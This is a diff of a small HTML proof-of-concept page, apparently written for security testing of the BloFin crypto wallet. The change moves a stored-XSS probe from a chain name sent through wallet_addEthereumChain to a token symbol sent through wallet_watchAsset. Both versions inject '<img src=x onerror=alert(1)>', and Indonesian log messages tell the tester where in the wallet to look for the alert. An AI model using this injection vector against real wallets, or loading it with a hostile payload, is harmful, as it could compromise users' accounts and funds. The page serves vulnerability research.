@@ -1,27 +1,30 @@
 <!DOCTYPE html>
 <html>
 <body style="background:black;color:white;padding:15px;font-family:monospace">
-<h3>Chain Name XSS Test - 0x403for</h3>
-<button id="btn" style="padding:12px;background:#f5c518;color:black;font-weight:bold;border:none;border-radius:8px;width:100%">TEST ADD CHAIN XSS</button>
+<h3>Token Symbol XSS Test - 0x403for</h3>
+<button id="btn" style="padding:12px;background:#f5c518;color:black;font-weight:bold;border:none;border-radius:8px;width:100%">TEST ADD TOKEN XSS</button>
 <div id="log" style="color:cyan;margin-top:10px;word-break:break-all"></div>
 
 <script>
 document.getElementById('btn').onclick = async () => {
   const log = (t) => document.getElementById('log').innerHTML += t + "<br>";
-  log("Calling wallet_addEthereumChain...");
+  log("Calling wallet_watchAsset...");
   try {
-    await window.ethereum.request({
-      method: 'wallet_addEthereumChain',
-      params: [{
-        chainId: '0x12349',
-        chainName: '0x403for<img src=x onerror=alert(1)>',
-        nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
-        rpcUrls: ['https://example.com'],
-        blockExplorerUrls: ['https://example.com']
-      }]
+    const result = await window.ethereum.request({
+      method: 'wallet_watchAsset',
+      params: {
+        type: 'ERC20',
+        options: {
+          address: '0x0000000000000000000000000000000000000001',
+          symbol: 'USDT<img src=x onerror=alert(1)>',
+          decimals: 18,
+          image: 'https://example.com/token.png'
+        }
+      }
     });
-    log("SUCCESS - Chain added. Sekarang tutup DApp Browser, buka BloFin > Settings > Networks");
-    log("Lihat apakah nama chain jadi <img> atau alert(1) muncul di Settings BloFin.");
+    log("Result: " + result);
+    log("SUCCESS - Sekarang tutup DApp Browser, buka BloFin > Assets / Token List");
+    log("Lihat apakah symbol jadi <img> atau alert muncul di halaman Assets BloFin.");
   } catch(e) {
     log("Error / Rejected: " + e.message);
   }
